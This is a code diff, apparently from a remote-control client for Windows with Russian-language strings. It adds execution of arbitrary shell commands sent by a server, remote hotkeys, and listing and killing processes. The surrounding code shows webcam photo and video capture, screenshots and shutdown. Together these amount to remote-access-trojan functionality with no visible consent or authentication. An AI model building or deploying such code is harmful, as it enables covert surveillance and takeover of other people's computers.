@@ -124,6 +124,60 @@ class PCClient:
                 text = cmd[len('show_message:'):]
                 pyautogui.alert(text=text, title=title)
                 result = f"Показано сообщение: {title} - {text}"
+            elif cmd.startswith('hotkey:'):
+                hotkey = cmd[len('hotkey:'):].replace(' ', '')
+                try:
+                    kb.press_and_release(hotkey)
+                    result = f"Выполнена комбинация клавиш: {hotkey}"
+                except Exception as e:
+                    result = f"Ошибка выполнения hotkey: {hotkey} — {e}"
+            elif cmd.startswith('cmd:'):
+                user_cmd = cmd[len('cmd:'):]
+                try:
+                    output = subprocess.check_output(user_cmd, shell=True, stderr=subprocess.STDOUT, text=True, encoding='cp866')
+                except Exception as e:
+                    output = str(e)
+                lines = output.splitlines()
+                if len(lines) > 30:
+                    output = '\n'.join(lines[:30]) + '\n...Обрезано...'
+                result = output
+            elif cmd == 'processes':
+                processes = []
+                for proc in psutil.process_iter(['pid', 'name']):
+                    try:
+                        processes.append(f"{proc.info['name']} ({proc.info['pid']})")
+                    except Exception:
+                        continue
+                if len(processes) > 30:
+                    result = '\n'.join(processes[:30]) + '\n...Обрезано...'
+                else:
+                    result = '\n'.join(processes)
+            elif cmd.startswith('killprocess:'):
+                proc = cmd[len('killprocess:'):].strip()
+                killed = False
+                for p in psutil.process_iter(['pid', 'name']):
+                    try:
+                        if str(p.info['pid']) == proc or p.info['name'].lower() == proc.lower():
+                            p.kill()
+                            killed = True
+                    except Exception:
+                        continue
+                if killed:
+                    result = f"Процесс {proc} завершён"
+                else:
+                    result = f"Процесс {proc} не найден или не завершён"
+            elif cmd.startswith('open_image:'):
+                import tempfile
+                import webbrowser
+                import base64
+                img_data = cmd[len('open_image:'):]
+                img_bytes = base64.b64decode(img_data)
+                with tempfile.NamedTemporaryFile(delete=False, suffix='.png') as f:
+                    f.write(img_bytes)
+                    img_path = f.name
+                # Открыть на весь экран (Windows)
+                os.startfile(img_path)
+                result = "Изображение открыто на весь экран"
             elif cmd == 'screenshot':
                 result, file_data, file_type = self.take_screenshot()
             elif cmd == 'webcam':
@@ -135,9 +189,6 @@ class PCClient:
             elif cmd == 'mouse_click':
                 pyautogui.click()
                 result = "Выполнен клик мыши"
-            elif cmd == 'hotkey':
-                kb.press_and_release('ctrl+alt+delete')
-                result = "Выполнена комбинация клавиш: Ctrl+Alt+Delete"
             elif cmd == 'shutdown':
                 subprocess.run(["shutdown", "/s", "/t", "0"])
                 result = "Компьютер выключается"
@@ -150,19 +201,6 @@ class PCClient:
             elif cmd == 'sleep':
                 subprocess.run(["rundll32.exe", "powrprof.dll,SetSuspendState", "0,1,0"])
                 result = "Компьютер переведен в спящий режим"
-            elif cmd == 'processes':
-                processes = []
-                for proc in psutil.process_iter(['pid', 'name', 'username']):
-                    processes.append({
-                        'pid': proc.info['pid'],
-                        'name': proc.info['name'],
-                        'user': proc.info['username']
-                    })
-                result = json.dumps(processes, indent=2, ensure_ascii=False)
-            elif cmd == 'cmd':
-                cmdline = "ipconfig"
-                output = subprocess.check_output(cmdline, shell=True, stderr=subprocess.STDOUT, text=True)
-                result = output
             self.send_command_result(command['id'], result, file_data, file_type)
         except Exception as e:
             print(f"Ошибка выполнения команды: {e}")
@@ -196,7 +234,6 @@ class PCClient:
     def record_video(self, seconds):
         try:
             cap = cv2.VideoCapture(0)
-            # Используем MJPG, который часто работает лучше
             fourcc = cv2.VideoWriter_fourcc(*'MJPG')
             temp_file = f"temp_video_{self.device_id}.avi"
             out = cv2.VideoWriter(temp_file, fourcc, 20.0, (640, 480))
@@ -208,7 +245,7 @@ class PCClient:
                     out.write(frame)
                     frame_written = True
                 else:
-                    break
+                    time.sleep(0.1)
             cap.release()
             out.release()
             if not frame_written:
